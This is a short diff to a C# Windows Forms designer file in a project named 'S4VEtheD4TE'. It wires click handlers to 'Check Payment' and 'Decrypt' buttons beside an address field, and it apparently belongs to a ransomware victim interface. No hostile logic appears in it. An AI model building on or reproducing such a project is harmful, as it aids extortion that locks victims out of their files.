@@ -179,6 +179,7 @@ namespace S4VEtheD4TE
             this.buttonCheckPayment.TabIndex = 13;
             this.buttonCheckPayment.Text = "Check Payment";
             this.buttonCheckPayment.UseVisualStyleBackColor = true;
+            this.buttonCheckPayment.Click += new System.EventHandler(this.buttonCheckPayment_Click);
             // 
             // groupBox1
             // 
@@ -214,6 +215,7 @@ namespace S4VEtheD4TE
             this.buttonDecrypt.TabIndex = 15;
             this.buttonDecrypt.Text = "Decrypt";
             this.buttonDecrypt.UseVisualStyleBackColor = true;
+            this.buttonDecrypt.Click += new System.EventHandler(this.buttonDecrypt_Click);
             // 
             // textBoxAddress
             // 
